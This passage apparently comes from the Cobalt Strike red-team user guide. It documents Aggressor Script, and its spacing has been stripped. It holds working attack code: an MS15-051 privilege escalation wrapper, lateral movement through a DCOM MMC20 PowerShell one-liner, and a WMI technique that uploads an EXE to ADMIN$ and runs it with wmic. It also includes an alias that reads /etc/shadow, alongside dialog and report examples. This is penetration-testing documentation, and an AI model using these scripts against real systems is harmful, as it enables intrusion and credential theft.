aswell.Whentheusertypeselevatems15-051foo,CobaltStrikewillrun&ms15_051_exploit
withthesearguments:$1isthebeaconsessionID.$2isthelistenername(e.g.,foo).Here'sthe
&ms15_051_exploitfunction:
# Integrate windows/local/ms15_051_client_copy_image from Metasploit
# https://github.com/rapid7/metasploit-
framework/blob/master/modules/exploits/windows/local/ms15_051_client_copy_image.rb
sub ms15_051_exploit {
local('$stager $arch $dll');
# acknowledge this command
btask($1, "Task Beacon to run " . listener_describe($2) . " via ms15-051",
"T1068");
# tune our parameters based on the target arch
if (-is64 $1) {
$arch = "x64";
$dll = getFileProper(script_resource("modules"), "cve-2015-1701.x64.dll");
}
else {
$arch = "x86";
$dll = getFileProper(script_resource("modules"), "cve-2015-1701.x86.dll");
}
# generate our shellcode
$stager = payload($2, $arch);
# spawn a Beacon post-ex job with the exploit DLL
bdllspawn!($1, $dll, $stager, "ms15-051", 5000);
# link to our payload if it's a TCP or SMB Beacon
beacon_link($1, $null, $2);
}
Thisfunctionuses&btasktoacknowledgetheactiontotheuser.Thedescriptionin&btaskwill
goinCobaltStrike'slogsandreportsaswell.T1068istheMITREATT&CKtechniquethat
correspondstothisaction.
ThisfunctionrepurposesanexploitfromtheMetasploitFramework.Thisexploitiscompiledas
cve-2015-1701.[arch].dllwithx86andx64variants.Thisfunction'sfirsttaskistoreadthe
exploitDLLthatcorrespondstothetargetsystem'sarchitecture.The-is64predicatehelpswith
this.
UserGuide www.helpsystems.com page:148
AggressorScript/Beacon
The&payloadfunctiongeneratesrawoutputforourlistenernameandthespecified
architecture.
The&bdllspawnfunctionspawnsatemporaryprocess,injectsourexploitDLLintoit,andpasses
ourexportedpayloadasanargument.ThisisthecontracttheMetasploitFrameworkusesto
passshellcodetoitsprivilegeescalationexploitsimplementedasReflectiveDLLs.
Finally,thisfunctioncalls&beacon_link.IfthetargetlistenerisanSMBorTCPBeaconpayload,
&beacon_linkwillattempttoconnecttoit.
Lateral Movement (Run a Command)
Beacon'sremote-execcommandattemptstorunacommandonaremotetarget.Thiscommand
acceptsaremote-execmethod,atarget,andacommand+arguments.The&beacon_remote_
exec_method_registerfunctionisbothareallylongfunctionnameandmakesanewmethod
availabletoremote-exec.
beacon_remote_exec_method_register("com-mmc20", "Execute command via
MMC20.Application COM Object", &mmc20_exec_method);
Thiscoderegisterstheremote-execmethodcom-mmc20withBeacon'sremote-execcommand.
Adescriptionisgivenaswell.Whentheusertypesremote-execcom-mmc20
c:\windows\temp\malware.exe,CobaltStrikewillrun&mmc20_exec_methodwiththese
arguments:$1isthebeaconsessionID.$2isthetarget.$3isthecommandandarguments.
Here'sthe&mmc20_exec_methodfunction:
sub mmc20_exec_method {
local('$script $command $args');
# state what we're doing.
btask($1, "Tasked Beacon to run $3 on $2 via DCOM", "T1175");
# separate our command and arguments
if ($3 ismatch '(.*?) (.*)') {
($command, $args) = matched();
}
else {
$command = $3;
$args = "";
}
# build script that uses DCOM to invoke ExecuteShellCommand on MMC20.Application
object
$script = '[activator]::CreateInstance([type]::GetTypeFromProgID
("MMC20.Application", "';
$script .= $2;
$script .= '")).Document.ActiveView.ExecuteShellCommand("';
$script .= $command;
$script .= '", $null, "';
$script .= $args;
$script .= '", "7");';
# run the script we built up
bpowershell!($1, $script, "");
}
UserGuide www.helpsystems.com page:149
AggressorScript/Beacon
Thisfunctionuses&btasktoacknowledgethetaskanddescribeittotheoperator(andlogsand
reports).T1175istheMITREATT&CKtechniquethatcorrespondstothisaction.Ifyouroffense
techniquedoesnotfitintoMITREATT&CK,don'tfret.Somecustomersareverymuchreadyfor
achallengeandbenefitwhentheirredteamcreativelydeviatesfromwhatareknownoffense
techniques.Doconsiderwritingablogpostaboutitfortherestofuslater.
Thisfunctionthensplitsthe$3argumentintocommandandargumentportions.Thisisdone
becausethetechniquerequiresthatthesevaluesareseparate.
Afterwards,thisfunctionbuildsupaPowerShellcommandstringthatlookslikethis:
[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application",
"TARGETHOST")).Document.ActiveView.ExecuteShellCommand
("c:\windows\temp\a.exe", $null, "", "7");
ThiscommandusestheMMC20.ApplicationCOMobjecttoexecuteacommandonaremote
target.ThismethodwasdiscoveredasalateralmovementoptionbyMattNelson:
https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-
object/
Thisfunctionuses&bpowershelltorunthisPowerShellscript.Thesecondargumentisanempty
stringtosuppressthedefaultdowncradlecradle(iftheoperatorranpowershell-import
previously).Ifyouprefer,youcouldmodifythisexampletouse&bpowerpicktorunthisone-
linerwithoutpowershell.exe.
Thisexampleisoneofthemajormotivatorsformetoaddtheremote-execcommandandAPIto
CobaltStrike.Thisisanexcellent"executethiscommand"primitive,butend-to-end
weaponization(spawningasession)usuallyincludesusingthisprimitivetorunaPowerShell
one-linerontarget.Foralotofreasons,thisisnottherightchoiceinmanyengagements.
Exposingthisprimitivethroughtheremote-execinterfacegivesyouchoiceabouthowtobest
makeuseofthiscapability(withoutforcingchoicesyoudon'twantmadeforyou).
Lateral Movement (Spawn a Session)
Beacon'sjumpcommandattemptstospawnanewsessiononaremotetarget.Thiscommand
acceptsanexploitname,atarget,andalistener.The&beacon_remote_exploit_registerfunction
makesanewmoduleavailabletojump.
beacon_remote_exploit_register("wmi", "x86", "Use WMI to run a Beacon
payload", lambda(&wmi_remote_spawn, $arch => "x86"));
beacon_remote_exploit_register("wmi64", "x64", "Use WMI to run a Beacon
payload", lambda(&wmi_remote_spawn, $arch => "x64"));
Theabovefunctionsregisterwmiandwmi64optionsforusewiththejumpcommand.The
&lambdafunctionmakesacopyof&wmi_remote_spawnandsets$archasastaticvariable
scopedtothatfunctioncopy.Usingthismethod,we'reabletousethesamelogictopresenttwo
lateralmovementoptionsfromoneimplementation.Here'sthe&wmi_remote_spawnfunction:
# $1 = bid, $2 = target, $3 = listener
sub wmi_remote_spawn {
local('$name $exedata');
UserGuide www.helpsystems.com page:150
AggressorScript/SSHSessions
btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3) . ") via WMI",
"T1047");
# we need a random file name.
$name = rand(@("malware", "evil", "detectme")) . rand(100) . ".exe";
# generate an EXE. $arch defined via &lambda when this function was registered
with
# beacon_remote_exploit_register
$exedata = artifact_payload($3, "exe", $arch);
# upload the EXE to our target (directly)
bupload_raw!($1, "\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name", $exedata);
# execute this via WMI
brun!($1, "wmic /node:\" $+ $2 $+ \" process call create \"\\\\ $+ $2 $+
\\ADMIN\$\\ $+ $name $+ \"");
# assume control of our payload (if it's an SMB or TCP Beacon)
beacon_link($1, $2, $3);
}
The&btaskfunctionfulfillsourobligationtologwhattheuserintendedtodo.TheT1047
argumentassociatesthisactionwithTactic1047inMITRE'sATT&CKmatrix.
The&artfiact_payloadfunctiongeneratesastagelessartifacttorunourpayload.Itusesthe
ArtifactKithookstogeneratethisfile.
The&bupload_rawfunctionuploadstheartifactdatatothetarget.Thisfunctionuses
\\target\ADMIN$\filename.exetodirectlywritetheEXEtotheremotetargetviaanadmin-only
share.
&brunrunswmic/node:"target"processcallcreate"\\target\ADMIN$\filename.exe"to
executethefileontheremotetarget.
&beacon_linkassumescontrolofthepayload,ifit'sanSMBorTCPBeacon.
SSH Sessions
CobaltStrike'sSSHclientspeakstheSMBBeaconprotocolandimplementsasub-setof
Beacon'scommandsandfunctions.FromtheperspectiveofAggressorScript,anSSHsessionisa
Beaconsessionwithfewercommands.
What type of session is it?
MuchlikeBeaconsessions,SSHsessionshaveanID.CobaltStrikeassociatestasksand
metadatawiththisID.The&beaconsfunctionwillalsoreturninformationaboutallCobaltStrike
sessions(SSHsessionsANDBeaconsessions).Usethe-issshpredicatetotestifasessionisan
SSHsession.The-isbeaconpredicatetestsifasessionisaBeaconsession.
Here'safunctiontofilter&beaconstoSSHsessionsonly:
sub ssh_sessions {
return map({
if (-isssh $1['id']) {
UserGuide www.helpsystems.com page:151
AggressorScript/SSHSessions
return $1;
}
else {
return $null;
}
}, beacons());
}
Aliases
YoumayaddcommandstotheSSHconsolewiththessh_aliaskeyword.Here'sascripttoalias
hashdumptograb/etc/shadowifyou'reanadmin.
ssh_alias hashdump {
if (-isadmin $1) {
bshell($1, "cat /etc/shadow");
}
else {
berror($1, "You're (probably) not an admin");
}
}
Puttheaboveintoascript,loaditintoCobaltStrike,andtypehashdumpinsideofanSSH
console.CobaltStrikewilltabcompleteSSHaliasestoo.
Youmayalsousethe&ssh_aliasfunctiontodefineanSSHalias.
CobaltStrikepassesthefollowingargumentstoanalias:$0isthealiasnameandarguments
withoutanyparsing.$1istheIDofthesessionthealiaswastypedfrom.Thearguments$2and
oncontainanindividualargumentpassedtothealias.Thealiasparsersplitsargumentsby
spaces.Usersmayuse"doublequotes"togroupwordsintooneargument.
YoumayalsoregisteryouraliaseswiththeSSHconsole'shelpsystem.Use&ssh_command_
registertoregisteracommand.
Reacting to new SSH Sessions
AggressorScriptsmayreacttonewSSHsessionstoo.Usethessh_initialeventtosetup
commandsthatshouldrunwhenaSSHsessionbecomesavailable.
on ssh_initial {
# do some stuff
}
The$1argumenttossh_initialistheIDofthenewsession.
Popup Menus
YoumayalsoaddontotheSSHpopupmenu.Thesshpopuphookletsyouadditemstothe
SSHmenu.TheargumenttotheSSHpopupmenuisanarrayofselectedsessionIDs.
UserGuide www.helpsystems.com page:152
AggressorScript/OtherTopics
popup ssh {
item "Run All..." {
prompt_text("Which command to run?", "w", lambda({
binput(@ids, "shell $1");
bshell(@ids, $1);
}, @ids => $1));
}
}
You'llnoticethatthisexampleisverysimilartotheexampleusedintheBeaconchapter.For
example,Iuse&binputtopublishinputtotheSSHconsole.Iuse&bshelltotasktheSSHsession
torunacommand.Thisisallcorrect.Remember,internally,anSSHsessionisaBeaconsession
asfarasmostofCobaltStrike/AggressorScrioptisconcerned.
Other Topics
CobaltStrikeoperatorsandscriptscommunicateglobaleventstothesharedeventlog.
AggressorScriptsmayrespondtothisinformationtoo.Theeventlogeventsbeginwithevent_.
Tolistforglobalnotifications,usetheevent_notifyhook.
on event_notify {
println("I see: $1");
}
Topostamessagetothesharedeventlog,usethe&sayfunction.
say("Hello World");
Topostamajoreventornotification(notnecessarilychit-chat),usethe&elogfunction.The
deconflictionserverwillautomaticallytimestampandstorethisinformation.Thisinformation
willalsoshowupinCobaltStrike'sActivityReport.
elog("system shutdown initiated");
Timers
Ifyou'dliketoexecuteataskperiodically,thenyoushoulduseoneofAggressorScript'stimer
events.Theseeventsareheartbeat_X,whereXis1s,5s,10s,15s,30s,1m,5m,10m,15m,20m,
30m,or60m.
on heartbeat_10s {
println("I happen every 10 seconds");
}
Dialogs
AggressorScriptprovidesseveralfunctionstopresentandrequestinformationfromtheuser.
Use&show_messagetoprompttheuserwithamessage.Use&show_errortoprompttheuser
UserGuide www.helpsystems.com page:153
AggressorScript/OtherTopics
withanerror.
bind Ctrl+M {
show_message("I am a message!");
}
Use&prompt_texttocreateadialogthataskstheuserfortextinput.
prompt_text("What is your name?", "Joe Smith", {
show_message("Please $1 $+ , pleased to meet you");
});
The&prompt_confirmfunctionissimilarto&prompt_text,butinsteaditasksayes/noquestion.
Custom Dialogs
AggressorScripthasanAPItobuildcustomdialogs.&dialogcreatesadialog.Adialogconsistsof
rowsandbuttons.Arowisalabel,arowname,aGUIcomponenttotakeinput,andpossiblya
helpertosettheinput.Buttonsclosethedialogandtriggeracallbackfunction.Theargumentto
thecallbackfunctionisadictionarymappingeachrow'snametothevalueinitsGUIcomponent
thattakesinput.Use&dialog_showtoshowadialog,onceit'sbuilt.
Here'sadialogthatlookslikeAttacks->WebDrive-by->HostFilefromCobaltStrike:
sub callback {
println("Dialog was actioned. Button: $2 Values: $3");
}
$dialog = dialog("Host File", %(uri => "/download/file.ext", port => 80,
mimetype => "automatic"), &call);
dialog_description($dialog, "Host a file through Cobalt Strike's web
server");
drow_file($dialog, "file", "File:");
drow_text($dialog, "uri", "Local URI:");
drow_text($dialog, "host", "Local Host:", 20);
drow_text($dialog, "port", "Local Port:");
drow_combobox($dialog, "mimetype", "Mime Type:", @("automatic",
"application/octet-stream",
"text/html", "text/plain"));
dbutton_action($dialog, "Launch");
dbutton_help($dialog, "https://www.cobaltstrike.com/help-host-file");
dialog_show($dialog);
Let'swalkthroughthisexample:The&dialogcallcreatestheHostFiledialog.Thesecond
parameterto&dialogisadictionarythatsetsdefaultvaluesfortheuri,port,andmimetype
rows.Thethirdparameterisareferencetoacallbackfunction.AggressorScriptwillcallthis
functionwhentheuserclickstheLaunchbutton.&dialog_descriptionplacesadescriptionatthe
topofthedialog.Thisdialoghasfiverows.Thefirstrow,madeby&drow_file,hasthelabel
UserGuide www.helpsystems.com page:154
AggressorScript/CustomReports
"File:",thename"file",andittakesinputasatextfield.Thereisahelperbuttontochooseafile
andpopulatethetextfield.Theothersrowsareconceptuallysimilar.&dbutton_actionand
&dbutton_helpcreatebuttonsthatarecenteredatthebottomofthedialog.&dialog_show
showsthedialog.
Here'sthedialog:
Ascripteddialog.
Custom Reports
CobaltStrikeusesadomain-specificlanguagetodefineitsreports.Thislanguageissimilarto
AggressorScriptbutdoesnothaveaccesstomostofitsAPIs.Thereportgenerationprocess
happensinitsownscriptengineisolatedfromyourclient.
ThereportscriptenginehasaccesstoadataaggregationAPIandafewprimitivestospecifythe
structureofaCobaltStrikereport.
Thedefault.rptfiledefinesthedefaultreportsinCobaltStrike.
Loading Reports
GotoCobaltStrike->Preferences->Reportstoloadacustomreport.PresstheFoldericon
andselecta.rptfile.PressSave.YoushouldnowseeyourcustomreportundertheReporting
menuinCobaltStrike.
UserGuide www.helpsystems.com page:155
AggressorScript/CustomReports
Loadareportfilehere.
Report Errors
IfCobaltStrikehadtroublewithyourreport(e.g.,asyntaxerror,runtimeerror,etc.)thiswill
showupinthescriptconsole.GotoView->ScriptConsoletoseethesemessages.
"Hello World" Report
Here'sasimple"HelloWorld"report.Thisreportdoesn'trepresentanythingspecial.Itmerely
showshowtogetstartedwithacustomreport.
# default description of our report [the user can change this].
describe("Hello Report", "This is a test report.");
# define the Hello Report
report "Hello Report" {
# the first page is the cover page of our report.
page "first" {
# title heading
h1($1['long']);
# today's date/time in an italicized format
ts();
# a paragraph [could be the default...
p($1['description']);
}
# this is the rest of the report
page "rest" {
# hello world paragraph
p("Hello World!");
UserGuide www.helpsystems.com page:156
AggressorScript/CompatibilityGuide
}
}
AggressorScriptdefinesnewreportswiththereportkeywordfollowedbyareportnameanda
blockofcode.Usethepagekeywordwithinareportblocktodefinewhichpagetemplatetouse.
Contentforapagetemplatemayspanmultiplepages.Thefirstpagetemplateisthecoverof
CobaltStrike'sreports.Thisexampleuses&h1toprintatitleheading.The&tsfunctionprintsa
date/timestampforthereport.Andthe&pfunctionprintsaparagraph.
The&describefunctionsetsadefaultdescriptionofthereport.Theusermayeditthiswhen
theygeneratethereport.Thisinformationispassedtothereportaspartofthereportmetadata
inthe$1parameter.The$1parameterisadictionarywithinformationabouttheuser's
preferencesforthereport.
Data Aggregation API
CobaltStrikeReportsdependontheDataAggregationAPItosourcetheirinformation.ThisAPI
providesyouamergedviewofdatafromallteamserver'syourclientiscurrentlyconnectedto.
TheDataAggregationAPIallowsreportstoprovideacomprehensivereportoftheassessment
activities.Thesefunctionsbeginwiththeagprefix(e.g.,&agTargets).Thereportenginepassesa
dataaggregatemodelwhenitgeneratesareport.Thismodelisthe$3parameter.
Compatibility Guide
ThispagedocumentsCobaltStrikechangesversion-to-versionthatmayaffectcompatability
withyourcurrentAggressorScripts.Ingeneral,it'sourgoalthatascriptwrittenforCobalt
Strike3.0isforward-compatiblewithfuture3.xreleases.Majorproductreleases(e.g.,3.0->4.0)
dogiveussomelicensetorevisitAPIsandbreaksomeofthiscompatability.Sometimes,a
compatabilitybreakingAPIchangeisinevitable.Thesechangesaredocumentedhere.
Cobalt Strike 4.x
1. CobaltStrike4.xmademajorchangestoCobaltStrike'slistenermanagementsystems.
Thesechangesincludednamechangesforseveralpayloads.Scriptsthatanalyzethe
listenerpayloadnameshouldnotethesechanges:
l windows/beacon_smb/bind_pipeisnowwindows/beacon_bind_pipe
l windows/beacon_tcp/bind_tcpisnowwindows/beacon_bind_tcp
2. CobaltStrike4.xmovesawayfrompayloadstagers.Stagelesspayloadsarepreferredinall
post-exworkflows.Wherestagelessisn'tpossible;useanexplicitstagerthatworkswith
allpayloads.
Thejumppsexec_pshlateralmovementattackisagoodexampleoftheabove.This
automationgeneratesabind_pipestagertofitwithinthesizeconstraintsofaPowerShell
one-liner.Allpayloadsaresentthroughthisstagingprocess;regardlessoftheir
configuration.
Thisconventionchangewillbreaksomeprivilegeescalationscriptsthatfollowthepre-4.x
patternsintheElevateKit.&bstageisnowgoneasitsunderlyingfunctionalitywas
changedtoomuchtoincludeinCobaltStrike4.x.Wherepossible,privilegeescalation
UserGuide www.helpsystems.com page:157
AggressorScript/CompatibilityGuide
scriptsshoulduse&payloadtoexportapayload,runitviathetechnique,anduse
&beacon_linktoconnecttothepayload.Ifastagerisrequired;use&stager_bind_tcpto
exportaTCPstagerand&beacon_stage_tcptostageapayloadthroughthisstager.
3. CobaltStrike4.xremovesthefollowingAggressorScriptfunctions:
Function Replacement Reason
&bbypassuac &belevate &belevate is the preferred function to
spawn an elevated session on the local
system
&bpsexec_psh &bjump &bjump is the preferred function to spawn